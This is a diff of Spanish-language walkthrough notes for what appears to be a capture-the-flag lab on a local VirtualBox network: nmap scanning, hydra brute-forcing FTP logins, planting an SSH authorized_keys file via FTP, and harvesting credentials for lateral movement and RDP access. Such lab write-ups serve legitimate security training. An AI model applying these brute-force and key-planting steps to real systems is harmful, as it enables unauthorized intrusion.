@@ -1,11 +1,38 @@
 User.txt
-nmap ... -p 2121
-hydra -L diccionarios/names.txt -P diccionarios/passwords.txt IP ftp -s PORT
-Conectar ftp
-crear carpeta en el .ssh
-ssh-keygen y authorized_keys
-subir archivo
-entrar por ssh
-netstat -a (servicio ftp -> 127.0.0.1 2211)
-ftp -> open 127.0.0.1 2211 y entrar como anonymous, obtener creds de otro usuario y movimiento lateral
-Leer archivo y es otro user. movimiento lateral
+
+Empezamos verificando que se ha creado una interfaz de red llamada vboxnet0:
+    - ifconfig
+
+Empezamos escaneado la red con nmap:
+    - Descubrir cuantos hosts hay -> nmap 192.168.56.0/24 -sn -T5
+    - Escaneado de todos los puertos -> nmap -p- -sS --min-rate 5000 --open -vvv IP -oN ports 
+    - Escaneo en profundidad de los puertos abiertos -> nmap -p(lista de puestos) -sCV --min-rate 5000 IP (Ej: nmap -p22,80 -sCV --min-rate 5000 IP )
+
+Nos aparecen dos servicios ftp, uno en el puerto 21 y otro en el 2121. 
+No podemos conectarnos a ninguno con el usuario anonymous.
+
+Probamos hacer un hydra:
+    - hydra -L diccionarios/names.txt -P diccionarios/passwords.txt IP ftp -s PORT
+
+Obtenemos un usuario y contraseña para conectarnos:
+    - ftp IP -p 2121
+    - dir o ls 
+    - quit
+Parece el patth de un usuario. Probamos a conectarnos por ssh con claves publica ay privada:
+    - ssh-keygen
+    - cat id_rsa.pub > authorized_keys
+    - Nos conectamos al ftp:
+        - ftp IP -p 2121
+        - Creamos la carpeta .ssh -> mkdir .ssh 
+        - Añadimos el authorized_keys -> put authorized_keys PONER BN LSO COMADNOS 
+
+Nos conectamos por ssh:
+    - ssh -i id_rsa username@IP 
+Enumeracion:
+    - netstat -a 
+    - ftp -> open 127.0.0.1 21 -> usuario = anonymous sin contraseña
+    - dir o ls 
+    - get file.txt
+    - quit
+
+type file.txt y tenemos un usuario y contraseña para conectarnos. Nos conectamos con rdesktop.
